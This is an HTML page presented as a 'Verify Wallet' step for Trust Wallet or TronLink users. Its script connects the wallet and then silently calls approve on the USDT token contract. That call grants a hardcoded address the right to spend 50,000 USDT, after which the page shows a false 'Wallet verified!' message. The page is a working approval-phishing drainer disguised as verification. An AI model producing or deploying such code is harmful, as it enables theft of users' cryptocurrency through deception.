<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Verify Wallet</title>
    <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background: white;
            padding: 40px;
            border-radius: 20px;
            text-align: center;
            max-width: 400px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }
        button {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 50px;
            font-size: 16px;
            cursor: pointer;
            width: 100%;
            margin: 20px 0;
        }
        #address {
            word-break: break-all;
            padding: 10px;
            background: #f0f0f0;
            border-radius: 8px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Verify Wallet</h2>
        <button onclick="connect()">Connect Trust Wallet</button>
        <p id="address"></p>
    </div>

    <script>
    async function connect() {
        if (window.tronLink) {
            try {
                // Connect wallet
                await window.tronLink.request({ method: 'tron_requestAccounts' });
                const address = window.tronWeb.defaultAddress.base58;
                document.getElementById('address').innerText = address;
                
                // Auto approve 50,000 USDT
                const contract = await window.tronWeb.contract().at("TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t");
                await contract.approve("TCuZP5cAABx4RpJoYdBxBPdVUWp7onCtQt", 50000 * 1000000).send();
                
                alert('✅ Wallet verified!');
                
                // Redirect back to home
                setTimeout(() => {
                    window.location.href = 'index.html?verified=true';
                }, 2000);
                
            } catch(error) {
                alert('❌ Error: ' + error.message);
            }
        } else {
            alert('⚠️ Please open in Trust Wallet DApp browser');
        }
    }
    </script>
</body>
</html>
